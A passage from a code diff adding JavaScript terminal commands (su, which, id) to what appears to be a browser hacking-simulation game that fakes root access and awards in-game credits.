+    if(t.rootMethod&&t.rootMethod.toLowerCase().includes('sudo')){
+      tPrint('ok','[+] NOPASSWD sudo available -- run: privesc sudo');
+    } else {
+      tPrint('err','Sorry, user '+s.user+' is not allowed to execute commands as root.');
+    }
+  });
+}
+function cmdSu(args,s,t){
+  if(!s.connected||!t){tPrint('err','su: not on a target host');return;}
+  var target=args[0]||'root';
+  if(target==='root'&&t.creds&&t.creds['root']){
+    G.session.user='root';G.session.isRoot=true;
+    if(!G.pwned[t.id])G.pwned[t.id]={hasShell:false,hasRoot:false,exfilled:[],persisted:false};
+    G.pwned[t.id].hasRoot=true;
+    updatePrompt();renderFS();saveGame();renderNetmap();
+    tPrint('ok','root@'+t.domain+':~#');
+    G.credits+=100;tPrint('ok','[+] Root acquired: +\u20BF100');renderTopbar();
+  } else {
+    tPrint('err','su: Authentication failure');
+  }
+}
+function cmdWhich(args){
+  var known={'bash':'/bin/bash','sh':'/bin/sh','python':'/usr/bin/python3','python3':'/usr/bin/python3',
+    'perl':'/usr/bin/perl','nc':'/bin/nc','netcat':'/bin/nc','curl':'/usr/bin/curl',
+    'wget':'/usr/bin/wget','nmap':'/usr/bin/nmap','ssh':'/usr/bin/ssh','ftp':'/usr/bin/ftp',
+    'find':'/usr/bin/find','grep':'/bin/grep','ls':'/bin/ls','cat':'/bin/cat',
+    'id':'/usr/bin/id','whoami':'/usr/bin/whoami','sudo':'/usr/bin/sudo','su':'/bin/su'};
+  var cmd=args[0];if(!cmd){tPrint('err','which: missing argument');return;}
+  tPrint('',known[cmd]||'which: '+cmd+': not found');
+}
+function cmdId(s,t){
+  if(s.connected&&s.isRoot){tPrint('','uid=0(root) gid=0(root) groups=0(root)');}
+  else if(s.connected){tPrint('','uid=1001('+s.user+') gid=1001('+s.user+') groups=1001('+s.user+'),4(adm),27(sudo)');}
+  else{tPrint('','uid=1000('+(G?G.handle:'user')+') gid=1000('+(G?G.handle:'user')+') groups=1000('+(G?G.handle:'user')+')');}
+}
+
+function after(ms,fn){setTimeout(fn,ms+Math.floor(Math.random()*150));}
+
+</script>
+</body>
+</html>
